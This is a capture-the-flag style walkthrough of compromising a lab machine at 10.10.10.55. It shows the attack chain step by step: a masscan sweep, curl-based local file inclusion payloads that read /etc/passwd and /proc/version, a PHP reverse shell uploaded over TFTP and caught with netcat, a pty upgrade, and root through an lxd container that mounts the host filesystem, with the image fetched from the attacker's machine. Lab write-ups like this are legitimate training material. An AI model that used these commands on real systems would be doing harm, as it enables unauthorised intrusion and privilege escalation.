* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)

![alt text](./img/included.PNG?raw=true)  

## Recon-Enumeration  
sudo masscan -p1-65535 10.10.10.55 -e tun0 --rate=1000  
![alt text](./img/included01.PNG?raw=true)  

Ok, the url look’s vulnerable to LFI. So let's test it  
![alt text](./img/included02.PNG?raw=true)  
  
![alt text](./img/included03.PNG?raw=true)  

BINGO!

## Exploit  
Let’s use curl to get a clean view of the files
curl -v http://10.10.10.55/?file=../../../../../../../../../../../../etc/passwd  
![alt text](./img/included04.PNG?raw=true)  

curl -s -v http://10.10.10.55/?file=../../../../../../../../../../../../../../etc/issue  
![alt text](./img/included05.PNG?raw=true)  

curl -s -v http://10.10.10.55/?file=../../../../../../../../../../../../../../proc/version  
![alt text](./img/included06.PNG?raw=true)  

In the passwd we could see a user TFTP, maybe this service is active. Let’s try to connect to it and put a file in the server  
![alt text](./img/included07.PNG?raw=true)  

Perfect, create a php reverse shell page and upload it to the target.  
You can search the web for one or use the /usr/share/webshells/php/php-reverse-shell.php file, don’t forget to change de $ip and $port to yours

After upload it set up a netcat listener in the port you put in the file and let’s access the uploaded file.  
In the passwd we can see that the path of the tftp user is /var/lib/tftpboot, so the file is in this folder  
http://10.10.10.55/?file=../../../../../../../../../../../var/lib/tftpboot/shell-eldruin.php  
![alt text](./img/included08.PNG?raw=true)  

HABEMUS SHELL \o/\

## Privesc  
Run this command to get a better shell -> python3 -c 'import pty;pty.spawn("/bin/bash")'

We are logged as www-data and if we don’t have permission to read the user.txt (inside mike’s folder). So let’s try to privesc  
![alt text](./img/included09.PNG?raw=true)  

Since this is a continuation of the PATHFINDER machine, let’s try to log as mike with the password found on that machine  
![alt text](./img/included10.PNG?raw=true)  

Now we can get back to mike’s home directory and read the flag. Time to root…..

Mike is in the lxd group, so we can try to use the lxd-alpine to get root  
![alt text](./img/included11.PNG?raw=true)  

Just execute the commands in the followed order and you will get root:  
For a better explanation check this [link](https://www.hackingarticles.in/lxd-privilege-escalation/)  
> In your machine:  
git clone  https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
./build-alpine  
sudo python3 -m http.server 80  

> On target machine  
cd /tmp  
wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz  
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage  
lxc image list  
lxc init myimage ignite -c security.privileged=true  
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
lxc start ignite  
lxc exec ignite /bin/sh  
id  

![alt text](./img/included12.PNG?raw=true)  
  
It’s a little ugly, but is a root shell

To catch the flag just go to /mnt/root/root 
![alt text](./img/included13.PNG?raw=true)  

## Discoveries
As you could see there is a login.sql and inside we have another credential  
![alt text](./img/included14.PNG?raw=true)  

